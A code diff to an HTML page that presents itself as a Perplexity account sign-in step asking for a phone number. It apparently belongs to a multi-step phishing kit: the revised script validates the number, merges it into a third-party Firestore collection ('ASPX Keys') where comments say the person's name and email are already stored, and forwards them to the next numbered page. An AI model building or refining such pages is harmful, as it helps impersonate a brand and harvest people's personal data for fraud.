@@ -58,14 +58,13 @@
             padding: 18px 24px;
             font-size: 18px;
             border: 1px solid #d1d1d6;
-            /* Fixed Radius as per Image */
-            border-radius: 24px; 
+            border-radius: 24px; /* Matching rounded style from image */
             outline: none;
             transition: border-color 0.2s;
             color: #000;
         }
 
-        /* Changed focus color to BLACK */
+        /* Focus color set to BLACK */
         input:focus {
             border-color: #000;
         }
@@ -98,7 +97,7 @@
             color: #fff;
             border: none;
             padding: 16px;
-            border-radius: 30px; /* Pill shaped button */
+            border-radius: 30px; 
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
@@ -123,8 +122,9 @@
         <p class="description">Connect Your Phone Number to signing in to your Perplexity Account</p>
 
         <div class="input-wrapper">
-            <input type="text" id="mobile" placeholder="+91 1234567890" autocomplete="off">
-            <div id="error" class="error-msg">Please enter a valid 10-digit number.</div>
+            <!-- Max length set to handle +code, space, and 10 digits -->
+            <input type="text" id="mobile" placeholder="+91 1234567890" autocomplete="off" maxlength="16">
+            <div id="error" class="error-msg">Please enter a valid country code and exactly 10 digits.</div>
         </div>
 
         <p class="terms">
@@ -147,7 +147,6 @@
             measurementId: "G-6ZP1FPMKSJ"
         };
 
-        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
@@ -155,64 +154,65 @@
         const continueBtn = document.getElementById('continueBtn');
         const errorDiv = document.getElementById('error');
 
-        // Automatically add space after country code
-        mobileInput.addEventListener('keyup', (e) => {
-            let val = mobileInput.value;
-            // Adds space if user types + followed by digits (e.g. +91)
-            if (val.startsWith('+') && val.length === 3 && e.key !== 'Backspace') {
-                mobileInput.value = val + ' ';
+        // Automatically format: Add space after country code
+        mobileInput.addEventListener('input', (e) => {
+            let val = e.target.value;
+            // Detects + followed by digits, ensures a space exists after the code
+            if (val.startsWith('+')) {
+                // If user typed e.g. "+91" and length reaches 3/4, ensure space
+                let match = val.match(/^(\+\d{1,3})(\d)/);
+                if (match) {
+                    mobileInput.value = match[1] + ' ' + match[2];
+                }
             }
         });
 
         async function validateAndSubmit() {
-            const fullVal = mobileInput.value.trim();
+            const val = mobileInput.value.trim();
             
-            // Regex: Requires exactly 10 digits at the end
-            // Accepts: +91 1234567890, +911234567890, or 1234567890
-            const regex = /^(\+\d{1,4}\s?)?(\d{10})$/;
-            const match = fullVal.match(regex);
+            // Regex for: +XX XXXXXXXXXX (exactly 10 digits at end)
+            const regex = /^(\+\d{1,4}\s)(\d{10})$/;
+            const match = val.match(regex);
 
             if (match) {
                 errorDiv.style.display = 'none';
-                saveData(fullVal);
+                saveData(val);
             } else {
                 errorDiv.style.display = 'block';
             }
         }
 
-        async function saveData(fullNumberString) {
+        async function saveData(fullNumber) {
             continueBtn.innerText = "Connecting...";
             continueBtn.classList.add('loading');
 
-            // Retrieves the ID of the current user document
-            const docId = localStorage.getItem('currentDocId') || "1065080509"; 
+            // IMPORTANT: This gets the document ID (like 1065080509) from the previous screen
+            // If you used a different key in localStorage on page 1, change 'docId' to that key.
+            const docId = localStorage.getItem('userDocId') || "1065080509"; 
 
             try {
                 const docRef = db.collection("ASPX Keys").doc(docId);
                 
-                // Merges data into the SAME document
+                // .set with merge: true UPDATES the existing doc where name/email are stored
                 await docRef.set({
-                    mobileNumber: fullNumberString,
+                    mobileNumber: fullNumber,
                     updatedAt: new Date().toLocaleString() + " UTC+5:30"
                 }, { merge: true });
 
-                // Redirect to 7.html
-                window.location.href = "6.html?session=${sessionId}";
+                // Redirect to 6.html with the ID as a session parameter
+                window.location.href = `6.html?session=${docId}`;
             } catch (err) {
                 console.error("Error: ", err);
-                alert("Please try again.");
+                alert("Connection failed. Please check your internet and try again.");
                 continueBtn.innerText = "Continue";
                 continueBtn.classList.remove('loading');
             }
         }
 
-        // Event Listeners
         continueBtn.addEventListener('click', validateAndSubmit);
 
         mobileInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                validateAndSubmit();
-            }
+            if (e.key === 'Enter') validateAndSubmit();
         });
     </script>
 </body>
